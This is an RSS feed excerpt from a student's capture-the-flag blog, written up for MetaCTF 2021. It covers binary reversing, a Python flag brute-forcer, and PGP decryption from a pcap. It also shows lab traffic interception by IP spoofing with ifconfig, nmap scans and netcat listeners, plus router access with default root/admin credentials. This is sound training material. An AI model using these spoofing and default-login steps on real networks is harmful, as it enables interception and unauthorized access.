uuid: &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;M&lt;/span>&lt;span style="color:#f1fa8c">\xa4&lt;/span>&lt;span style="color:#f1fa8c">h&lt;/span>&lt;span style="color:#f1fa8c">\xdb\x1d\xaa&lt;/span>&lt;span style="color:#f1fa8c">H&lt;/span>&lt;span style="color:#f1fa8c">\x1c\x9b\xe7\xd9\xfe\xee&lt;/span>&lt;span style="color:#f1fa8c">B&lt;/span>&lt;span style="color:#f1fa8c">\xa4&lt;/span>&lt;span style="color:#f1fa8c">6&amp;#39;&lt;/span>
magic_end: E38A5B8C
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then convert that to hex (in the convert.py script) and we get the hex dump :).&lt;/p>
&lt;p>&lt;code>1553dc11170000020002170800104da468db1daa481c9be7d9feee42a436e38a5b8c&lt;/code>&lt;/p></description></item><item><title>MetaCTF 2021</title><link>https://murphe22.com/posts/metactf/</link><pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/metactf/</guid><description>&lt;p>&lt;strong>Ending Rank:&lt;/strong> 58th overall (total 1956 teams), 25th amongst student teams (total: 1039 teams)&lt;/p>
&lt;p>Starting Friday, December 3rd, 2021, MetaCTF will host it&amp;rsquo;s 7th annual virtual jeopardy-style CTF! This event is free and open to everyone, and participants can compete in teams of up to 4.&lt;/p>
&lt;p>This CTF will challenge participants of all skill levels to learn new cybersecurity techniques and skills, with problems covering a variety of topics such as web exploitation, cryptography, binary exploitation, reverse engineering, forensics, and reconnaissance.&lt;/p>
&lt;h1 id="intro" >Intro
&lt;span>
&lt;a href="#intro">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>This CTF was the first time our club has participated and it was an absolute blast. Thank you to my awesome team members (Rohan, Lane, and Bode)!!! We placed 58th overall and 25th amongst student teams!&lt;/p>
&lt;h1 id="darryl-vault" >Darryl Vault
&lt;span>
&lt;a href="#darryl-vault">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Dread Pirate Darryl has no qualms with a little bit - or a lot - of thievery, as you recently found out to your detriment. Suffice it to say his loot stash has grown quite a bit, and you find yourself down a whole bunch of valuables. This is, put simply, unacceptable. You need to rectify this situation, and returning the favor ought to do the trick.&lt;/p>
&lt;p>As a Dread Pirate, Dread Pirate Darryl has much better things to do than remembering all of his secrets, such as raiding other innocent CTF-goers or shouting &amp;ldquo;ARRRRR&amp;rdquo; at the top of his lungs repeatedly. Darryl commissioned a secret vault program to be written for him so that when he needs to take newly acquired loot back to his lair, he can ask it where he has to go.&lt;/p>
&lt;p>Unfortunately for Dread Pirate Darryl, the developer from whom he commissioned the vault was very proud of his work and wanted to show it off, and we here at MetaCTF have acquired a copy of it. Find Dread Pirate Darryl&amp;rsquo;s treasures! Enact your revenge!&lt;/p>
&lt;p>Note: The flag is the password used to access the location of Dread Pirate Darryl&amp;rsquo;s treasure.&lt;/p>
&lt;h2 id="solve" >Solve
&lt;span>
&lt;a href="#solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>First, i just ran the file to see what was going on and saw that there were four different options.
I went to ghidra, looked at the entry, got the first argument of libc start main and renamed main
Rebase Ghidra
Break main and look at what it’s doing
We have four possible inputs, right?
1, 2 3, 4&lt;/p>
&lt;p>Mother’s maiden name does not prompt for a password&lt;/p>
&lt;p>The password for 2&amp;amp;3 is just chilling in strings DARRYL_IS_THE_GREATEST&lt;/p>
&lt;p>4 asks for a password, but it doesnt output anything else. Hmmmmmmmmmmmm 👀&lt;/p>
&lt;p>Essentially, the password is checked on three separate occasions
We return to ghidra. Defined strings go burrrrr. “Hey, Darryl, I&amp;rsquo;m going to need your password” has three functions nearby it. Three???? hmmmmmmmmmmmmmmm&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/message.png" alt="idek">&lt;/p>
&lt;p>Why dont we click on those functions 👀&lt;/p>
&lt;p>Oh cool that last one looks sexy&lt;/p>
&lt;p>This is where i found the function i named funcwithtoomanynums. U will know it when u see it&lt;/p>
&lt;p>Inside that, the memcmp 0x27 goooo burrrrrr&lt;/p>
&lt;p>Let’s just fuck around in gdb and break at this memcmp with ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’ bc its len is 0x27&lt;/p>
&lt;p>Gdb go burrrrrr
ty gdb v cool&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/flag.png" alt="flag in memory">&lt;/p>
&lt;h1 id="easy-as-it-is" >Easy as it is
&lt;span>
&lt;a href="#easy-as-it-is">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the packet capture right before the flag was supposed to be revealed. Can you still find the flag? Note: You&amp;rsquo;ll need to decrypt in CyberChef rather than using a command line utility.&lt;/p>
&lt;h2 id="solve-1" >Solve
&lt;span>
&lt;a href="#solve-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Get the PGP message and private key from the pcap. Put it in CyberChef and notice it is still messed up. So, mess around with the decrompression and find that &lt;code>gzip&lt;/code> works.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/cyberChef.png" alt="cyberchef">&lt;/p>
&lt;p>&lt;code>MetaCTF{cleartext_private_pgp_keys}&lt;/code>&lt;/p>
&lt;h1 id="i-hate-python" >I Hate Python
&lt;span>
&lt;a href="#i-hate-python">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I hate Python, and now you will too. Find the password.&lt;/p>
&lt;h2 id="solve-2" >Solve
&lt;span>
&lt;a href="#solve-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Scripting fun:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#ff79c6">import&lt;/span> random
&lt;span style="color:#ff79c6">def&lt;/span> &lt;span style="color:#50fa7b">do_thing&lt;/span>(a, b):
&lt;span style="color:#ff79c6">return&lt;/span> ((a &lt;span style="color:#ff79c6">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>) &lt;span style="color:#ff79c6">&amp;amp;&lt;/span> b) &lt;span style="color:#ff79c6">^&lt;/span> ((a &lt;span style="color:#ff79c6">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>) &lt;span style="color:#ff79c6">|&lt;/span> b)
&lt;span style="color:#ff79c6">def&lt;/span> &lt;span style="color:#50fa7b">checkFlag&lt;/span>(x, prevLen):
random&lt;span style="color:#ff79c6">.&lt;/span>seed(&lt;span style="color:#bd93f9">997&lt;/span>)
k &lt;span style="color:#ff79c6">=&lt;/span> [random&lt;span style="color:#ff79c6">.&lt;/span>randint(&lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#bd93f9">256&lt;/span>) &lt;span style="color:#ff79c6">for&lt;/span> _ &lt;span style="color:#ff79c6">in&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">range&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(x))]
a &lt;span style="color:#ff79c6">=&lt;/span> { b: do_thing(&lt;span style="color:#8be9fd;font-style:italic">ord&lt;/span>(c), d) &lt;span style="color:#ff79c6">for&lt;/span> (b, c), d &lt;span style="color:#ff79c6">in&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">zip&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">enumerate&lt;/span>(x), k) }
b &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">list&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">range&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(x)))
random&lt;span style="color:#ff79c6">.&lt;/span>shuffle(b)
c &lt;span style="color:#ff79c6">=&lt;/span> [a[i] &lt;span style="color:#ff79c6">for&lt;/span> i &lt;span style="color:#ff79c6">in&lt;/span> b[::&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">1&lt;/span>]]
&lt;span style="color:#6272a4"># print(k)&lt;/span>
&lt;span style="color:#6272a4"># print(c)&lt;/span>
kn &lt;span style="color:#ff79c6">=&lt;/span> [&lt;span style="color:#bd93f9">47&lt;/span>, &lt;span style="color:#bd93f9">123&lt;/span>, &lt;span style="color:#bd93f9">113&lt;/span>, &lt;span style="color:#bd93f9">232&lt;/span>, &lt;span style="color:#bd93f9">118&lt;/span>, &lt;span style="color:#bd93f9">98&lt;/span>, &lt;span style="color:#bd93f9">183&lt;/span>, &lt;span style="color:#bd93f9">183&lt;/span>, &lt;span style="color:#bd93f9">77&lt;/span>, &lt;span style="color:#bd93f9">64&lt;/span>, &lt;span style="color:#bd93f9">218&lt;/span>, &lt;span style="color:#bd93f9">223&lt;/span>, &lt;span style="color:#bd93f9">232&lt;/span>, &lt;span style="color:#bd93f9">82&lt;/span>, &lt;span style="color:#bd93f9">16&lt;/span>, &lt;span style="color:#bd93f9">72&lt;/span>, &lt;span style="color:#bd93f9">68&lt;/span>, &lt;span style="color:#bd93f9">191&lt;/span>, &lt;span style="color:#bd93f9">54&lt;/span>, &lt;span style="color:#bd93f9">116&lt;/span>, &lt;span style="color:#bd93f9">38&lt;/span>, &lt;span style="color:#bd93f9">151&lt;/span>, &lt;span style="color:#bd93f9">174&lt;/span>, &lt;span style="color:#bd93f9">234&lt;/span>, &lt;span style="color:#bd93f9">127&lt;/span>]
valid &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">list&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">filter&lt;/span>(&lt;span style="color:#ff79c6">lambda&lt;/span> s: kn[s[&lt;span style="color:#bd93f9">0&lt;/span>]] &lt;span style="color:#ff79c6">==&lt;/span> s[&lt;span style="color:#bd93f9">1&lt;/span>], &lt;span style="color:#8be9fd;font-style:italic">enumerate&lt;/span>(c))))
&lt;span style="color:#6272a4"># print(valid)&lt;/span>
&lt;span style="color:#ff79c6">if&lt;/span> valid &lt;span style="color:#ff79c6">&amp;gt;&lt;/span> prevLen:
&lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#ff79c6">True&lt;/span>
&lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#ff79c6">False&lt;/span>
&lt;span style="color:#6272a4">#random.seed(997)&lt;/span>
k &lt;span style="color:#ff79c6">=&lt;/span> [random&lt;span style="color:#ff79c6">.&lt;/span>randint(&lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#bd93f9">256&lt;/span>) &lt;span style="color:#ff79c6">for&lt;/span> _ &lt;span style="color:#ff79c6">in&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">range&lt;/span>(&lt;span style="color:#bd93f9">25&lt;/span>)]
&lt;span style="color:#6272a4"># print(k)&lt;/span>
&lt;span style="color:#6272a4">#x = &amp;#34;A&amp;#34;*25&lt;/span>
&lt;span style="color:#6272a4"># a = {b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k)}&lt;/span>
&lt;span style="color:#6272a4">#kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]&lt;/span>
&lt;span style="color:#6272a4"># write a loop to go through all the possible ascii &lt;/span>
&lt;span style="color:#6272a4"># values and do_thing it with all values in k&lt;/span>
currFlag &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;MetaCTF{&amp;#39;&lt;/span>
&lt;span style="color:#ff79c6">for&lt;/span> i &lt;span style="color:#ff79c6">in&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">range&lt;/span>(&lt;span style="color:#bd93f9">25&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">8&lt;/span>):
&lt;span style="color:#ff79c6">for&lt;/span> j &lt;span style="color:#ff79c6">in&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">range&lt;/span>(&lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#bd93f9">128&lt;/span>):
nextFlag &lt;span style="color:#ff79c6">=&lt;/span> currFlag &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">chr&lt;/span>(j) &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>(&lt;span style="color:#bd93f9">16&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>i)
&lt;span style="color:#6272a4"># print(&amp;#34;test&amp;#34;)&lt;/span>
&lt;span style="color:#8be9fd;font-style:italic">print&lt;/span>(nextFlag)
&lt;span style="color:#ff79c6">assert&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(nextFlag) &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#bd93f9">25&lt;/span>)
&lt;span style="color:#ff79c6">if&lt;/span> checkFlag(nextFlag, &lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(currFlag)):
&lt;span style="color:#6272a4"># print(nextFlag)&lt;/span>
currFlag &lt;span style="color:#ff79c6">=&lt;/span> currFlag &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">chr&lt;/span>(j)
&lt;span style="color:#ff79c6">break&lt;/span>
&lt;span style="color:#6272a4"># print(currFlag)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>MetaCTF{yOu_w!N_th1$_0n3}&lt;/code>&lt;/p>
&lt;h1 id="interception-i" >Interception I
&lt;span>
&lt;a href="#interception-i">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.
ssh &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;p>If you get an SSH host key error, consider using
ssh -o &amp;ldquo;UserKnownHostsFile=/dev/null&amp;rdquo; -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;p>Note that the connection can take a while to initialize. It will say Granting console connection to device&amp;hellip; and then three dots will appear. After the third dot you should have a connection.&lt;/p>
&lt;h2 id="solve-note-i-did-this-at-2-am" >Solve (Note I did this at 2 AM)
&lt;span>
&lt;a href="#solve-note-i-did-this-at-2-am">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Gotta do some ip spoofing.&lt;/p>
&lt;ol>
&lt;li>first changed ip address to spoofy&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ifconfig eth0 192.168.0.2 netmask 255.255.255.0&lt;/code>&lt;/p>
&lt;ol start="2">
&lt;li>then do a lil ping to test connection and refresh arp cache so we changed the ip address&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ping 192.168.0.1&lt;/code>&lt;/p>
&lt;ol start="3">
&lt;li>then do a lil nmap mappy&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nmap -sn -PU 192.168.0.0/24&lt;/code>&lt;/p>
&lt;ol start="4">
&lt;li>then do a lil net catty cat&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nc -lu 192.168.0.2 8000&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{addr3s5_r3s0lut1on_pwn4g3}&lt;/code>&lt;/p>
&lt;h1 id="interception-ii" >Interception II
&lt;span>
&lt;a href="#interception-ii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Someone on this network is periodically sending the flag to &amp;hellip; someone else on this network, over TCP port 8000. Go get it.
ssh &lt;a href="mailto:ctf-46ed3559da08@host.cg21.metaproblems.com">ctf-46ed3559da08@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;h2 id="solve-3" >Solve
&lt;span>
&lt;a href="#solve-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Similar process to Interception I.&lt;/p>
&lt;ol>
&lt;li>There are more hosts up, so let&amp;rsquo;s see what is open.&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nmap -p 8000 192.168.0.0/24 -v | grep open&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">Discovered &lt;span style="color:#8be9fd;font-style:italic">open&lt;/span> port &lt;span style="color:#bd93f9">8000&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>tcp on &lt;span style="color:#bd93f9">192.168.0.78&lt;/span>
&lt;span style="color:#bd93f9">8000&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>tcp &lt;span style="color:#8be9fd;font-style:italic">open&lt;/span> http&lt;span style="color:#ff79c6">-&lt;/span>alt
&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Ping to test connection.&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ping 192.168.0.78&lt;/code>&lt;/p>
&lt;ol start="3">
&lt;li>Check interface that we gotta change&lt;/li>
&lt;/ol>
&lt;p>&lt;code>arp -a&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">ip&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">192&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">168&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">0&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">78.&lt;/span>ec2&lt;span style="color:#ff79c6">.&lt;/span>internal (&lt;span style="color:#bd93f9">192.168.0.78&lt;/span>) at &lt;span style="color:#bd93f9">02&lt;/span>:&lt;span style="color:#bd93f9">42&lt;/span>:&lt;span style="color:#bd93f9">0&lt;/span>a:&lt;span style="color:#bd93f9">00&lt;/span>:a3:c3 [ether] on eth0
&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>Change the ip&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ifconfig eth0 192.168.0.78 netmask 255.255.255.0&lt;/code>&lt;/p>
&lt;ol start="5">
&lt;li>
&lt;p>&lt;code>ping 192.168.0.78&lt;/code> to refresh the arp cache so it does the spoofy&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Setup the netcat connection&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nc -lvp 8000&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}&lt;/code>&lt;/p>
&lt;h1 id="interception-iii" >Interception III
&lt;span>
&lt;a href="#interception-iii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>192.168.55.3 is periodically sending the flag to 172.16.0.2 over UDP port 8000. Go get it.
By the way, I&amp;rsquo;ve been told the admins at this organization use really shoddy passwords.
ssh &lt;a href="mailto:ctf-f36ef72cadc1@host.cg21.metaproblems.com">ctf-f36ef72cadc1@host.cg21.metaproblems.com&lt;/a> -p 7000
Note: The password for this user is the flag from Interception I. You must finish Interception I before starting this challenge.&lt;/p>
&lt;h2 id="solve-4" >Solve
&lt;span>
&lt;a href="#solve-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>First enumerate&amp;hellip;. &lt;code>nmap -v 192.168.0.0/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/I3scan.png" alt="nmap scan">&lt;/p>
&lt;p>So&amp;hellip; telnet means we can connect to smtn&amp;hellip; we know it is a router bc usually default gateways have an end address of &amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&lt;strong>1&lt;/strong>&lt;/p>
&lt;p>Gotta identify the router&lt;/p>
&lt;p>&lt;code>nmap -O 192.168.0.1&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 08:57 UTC
Nmap scan report for ip-192-168-0-1.ec2.internal (192.168.0.1)
Host is up (0.000077s latency).
Not shown: 999 closed tcp ports (reset)
PORT STATE SERVICE
23/tcp open telnet
MAC Address: 02:42:0A:00:0F:42 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
&lt;/code>&lt;/pre>&lt;p>Important: &lt;strong>Linux 4.15-5.6&lt;/strong>&lt;/p>
&lt;p>google search: routers that use Linux 4.15 - 5.6 -&amp;gt; TP-Link&lt;/p>
&lt;p>Find root login -&amp;gt; &lt;a href="https://www.cleancss.com/router-default/TP-Link">TP Link Default Creds&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>username: root
password: admin
&lt;/code>&lt;/pre>&lt;p>When you get access, and do an &lt;code>ls&lt;/code>, find bird-2.0.8 -&amp;gt;
&lt;a href="https://blog.kintone.io/entry/bird">https://blog.kintone.io/entry/bird&lt;/a> and &lt;a href="https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html">https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html&lt;/a>&lt;/p>
&lt;p>Did not solve, but was ON THE RIGHT TRACK. At 4AM, I tried changing the OSPF cost BUT I CHANGED THE WRONG INTERFACE&amp;rsquo;S COST. BIG SAD.&lt;/p>
&lt;p>Here is the writeup from another person&amp;hellip; for next time.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/birdShit.png" alt="solve">&lt;/p>
&lt;h1 id="where-in-the-world" >Where in the World
&lt;span>
&lt;a href="#where-in-the-world">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I must say, every time I see one of these directional signs, I think I&amp;rsquo;ve got to make this into a CTF problem. It&amp;rsquo;s the idea of Open Source Intelligence (OSINT) or Geospatial Intelligence (GEOINT). The idea of being able to take an image and use all of the clues within it to infer details such as where it&amp;rsquo;s at or what&amp;rsquo;s happening in the photo.&lt;/p>
&lt;p>Here is one such picture of those signs. Your goal? Use those little details to find the name of the marina it&amp;rsquo;s at which you&amp;rsquo;ll submit for the flag (so MetaCTF{name of marina}&lt;/p>
